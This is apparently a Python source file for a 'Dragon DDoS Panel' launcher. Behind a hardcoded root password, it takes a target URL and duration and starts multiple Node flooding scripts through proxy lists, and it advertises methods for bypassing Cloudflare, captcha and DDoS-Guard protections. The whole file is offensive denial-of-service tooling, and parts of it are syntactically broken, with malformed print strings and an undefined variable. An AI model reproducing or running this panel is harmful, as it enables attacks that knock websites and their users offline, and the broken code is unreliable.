import socket

import os

import requests

import random

import getpass

import time

import sys

from operator import index

import socket

import random

import string

import threading

import getpass

import urllib

import getpass

from colorama import Fore, Back

import os,sys,time,re,requests,json

from requests import post

from time import sleep

from datetime import datetime, date

import codecs
from pystyle import Colors, Colorate

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxy.txt').readlines()
bots = len(proxys)
bots_str = str(bots)

def si():
    print(Colorate.Diagonal(Colors.yellow_to_red, "Welcome To Dragon DDoS Panel | User: root | Plan: VVIP | Proxy: " + bots_str + " | Happy To Use"))
    print("")
  
def layer7():
    clear()
    si()
    print(''' 
            LIST LAYER7 METHODS
            
TLS-SILIT - POWERFULL TLS METHODS FOR DDoS-GUARD [VVIP]
TLS - VERY POWERFUL TLS METHODS [BASIC]
MIX - ALL METHODS IN ONE [VVIP]
RAPID - SEND DDOS ATTACK FOR PROTECTION CLOUDFLARE UAM [VVIP]
CRASH - NORMAL BYPASS [BASIC]
HTTP-SILIT - POWERFULL METHOD FOR BYPASS CAPTCHA, PROTECTION CUSTOM, UAM AND DDoS-GUARD [VVIP]

HOW TO USE
METHODS URL TIME
''')

def menu():
    clear()
    print(Colorate.Diagonal(Colors.yellow_to_red, "Welcome To Silit Network Panel | User: root | Plan: ADMIN | Proxy: " + bots_str + " | Happy To Use"))
    print("")
    banner = '''
        ⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣤⡼⠀⢀⡀⣀⢱⡄⡀⠀⠀⠀⢲⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

Type Layer7 To See Layer7 Methods⠀⠀⠀⠀⠀  
'''
    print(Colorate.Diagonal(Colors.yellow_to_red, banner))
def main():
    menu()
    while(True):
        cnc = input(Colorate.Diagonal(Colors.yellow_to_red, "root@SilitNetwork#~"))
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()

        elif "TLS-SILIT" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'screen -dm node TLS-SILIT {host} {time} 32 10 proxy.txt')
                os.system(f'screen -dm node TLS-SILITv2 {host} {time} 32 10 proxy.txt')
                os.system(f'screen -dm node TLS-SILITv3 {host} {time} 32 10 proxy.txt')
                
                clear()
                
                print(f""
                
█▀ █░█ █▀▀ █▀▀ █▀▀ █▀ █▀
▄█ █▄█ █▄▄ █▄▄ ██▄ ▄█ ▄█

Type [CLS] To Clear Terminal

Method: TLS-SILIT

Target: {host}

Time: {time}

User: {user}

Plan: Admin

"")

            except IndexError:
                print('Usage: METHODS URL TIME');
                print('Example: TLS-SILIT https://example.com/ 60');
                
        elif "TLS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'screen -dm node TLS {host} {time} 32 10 proxy.txt root')
                os.system(f'screen -dm node TLS-SILIT {host} {time} 32 10 proxy.txt')
                os.system(f'screen -dm node TLS-SILITv2 {host} {time} 32 10 proxy.txt')
                os.system(f'screen -dm node TLS-SILITv3 {host} {time} 32 10 proxy.txt')  
                           
                clear()
                
               print(f""
               
█▀ █░█ █▀▀ █▀▀ █▀▀ █▀ █▀
▄█ █▄█ █▄▄ █▄▄ ██▄ ▄█ ▄█

Type [CLS] To Clear Terminal

Method: TLS

Target: {host}

Time: {time}

User: {user}

Plan: Admin
"")

            except IndexError:
                print('Usage: METHODS URL TIME');
                print('Example: TLS https://example.com/ 60');
                
        elif "MIX" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'screen -dm node TLS-SILITv3 {host} {time} 32 10 proxy.txt')
                os.system(f'screen -dm node TLS {host} {time} 32 10 proxy.txt root')
                os.system(f'screen -dm node HTTP-SILIT {host} {time} 32 10 proxy.txt')
                os.system(f'screen -dm node KILL {host} {time} 32 10 proxy.txt')
                os.system(f'screen -dm node ANALKILL {host} {time} 50 10')
                os.system(f'screen -dm node STROKE {host} {time} 32 10 proxy.txt')
                os.system(f'screen -dm node THOR {host} {time} 32 10 proxy.txt')
                os.system(f'screen -dm node THORv2 {host} {time} 32 10 proxy.txt')
                os.system(f'screen -dm node THORv3 {host} {time} 32 10 proxy.txt')
                os.system(f'screen -dm node TLS-CUM {host} {time} 32 10')
                os.system(f'screen -dm node TLS-NARUTO {host} 100 1024 {time}')
                os.system(f'screen -dm ./raw {host} {time} 32 10 proxy.txt gatau')
                
                clear()
                
                print(f'''
█▀ █░█ █▀▀ █▀▀ █▀▀ █▀ █▀
▄█ █▄█ █▄▄ █▄▄ ██▄ ▄█ ▄█

Type [CLS] To Clear Terminal

Method: MIX

Target: {host}

Time: {time}

User: {user}

Plan: Admin

''')

            except IndexError:
                print('Usage: METHODS URL TIME');
                print('Example: MIX https://example.com/ 60');             
                
        elif "RAPID" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'screen -dm node Rapid-Silit {host} {time} 10 proxy.txt 32 uam')
                os.system(f'screen -dm node Rapid-Silit {host} {time} 10 proxy.txt 32 captcha')
                
                clear()
                
                print(f'''
█▀ █░█ █▀▀ █▀▀ █▀▀ █▀ █▀
▄█ █▄█ █▄▄ █▄▄ ██▄ ▄█ ▄█

Type [CLS] To Clear Terminal

Method: RAPID

Target: {host}

Time: {time}

User: {user}

Plan: Admin

''')

            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: RAPID https://example.com/ 60');
                
        elif "CRASH" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'screen -dm node Crash-Silit {host} {time} 35 10 proxy.txt')
                
                clear()
                
                print(f'''
█▀ █░█ █▀▀ █▀▀ █▀▀ █▀ █▀
▄█ █▄█ █▄▄ █▄▄ ██▄ ▄█ ▄█

Type [CLS] To Clear Terminal

Method: CRASH

Target: {host}

Time: {time}

User: {user}

Plan: Admin

''')

            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: CRASH https://example.com/ 60');
                
        elif "HTTP-SILIT" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'screen -dm node HTTP-SILIT {host} {time} 600 10 proxy.txt')
                
                clear()
                
                print(f'''
█▀ █░█ █▀▀ █▀▀ █▀▀ █▀ █▀
▄█ █▄█ █▄▄ █▄▄ ██▄ ▄█ ▄█

Type [CLS] To Clear Terminal

Method: HTTP-SILIT

Target: {host}

Time: {time}

User: {user}

Plan: Admin

''')

            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: HTTP-SILIT https://example.com/ 60');

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            print(''' 
LAYER7 - SEE ALL LAYER7 METHODS
HELP - FOR HELP
CLEAR - CLEAR TERMINAL
''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "root"
    passwd = "LU6qeD_kPXeY"
    username = input("</> Username: ")
    password = getpass.getpass(prompt='</> Password: ')
    if username != user or password != passwd:
        print("")
        print("Password/Username Salah")        
        sys.exit(1)
    elif username == user and password == passwd:
        print("Welcome To Dragon DDoS Panel")
        time.sleep(0.3)
        main()

login()